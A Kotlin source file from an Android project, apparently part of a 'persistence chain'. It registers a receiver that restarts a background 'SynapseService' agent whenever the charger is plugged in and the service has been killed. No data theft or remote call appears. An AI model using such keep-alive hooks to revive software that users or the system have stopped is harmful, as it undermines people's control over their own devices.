package org.synapse.core.persistence

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log

/**
 * Power connected trigger. When the charger is plugged in, checks if the
 * SynapseService is alive and restarts it if dead.
 *
 * This catches cases where the device was off/charging and the agent was
 * killed — as soon as power is connected, we get another chance to restart.
 */
class PowerReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "Synapse"
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Intent.ACTION_POWER_CONNECTED) return

        Log.d(TAG, "PowerReceiver — charger connected")

        if (!PersistenceChain.isServiceRunning(context)) {
            Log.w(TAG, "PowerReceiver — service DEAD, restarting")
            PersistenceChain.start(context)
        } else {
            Log.d(TAG, "PowerReceiver — service already alive")
        }
    }
}
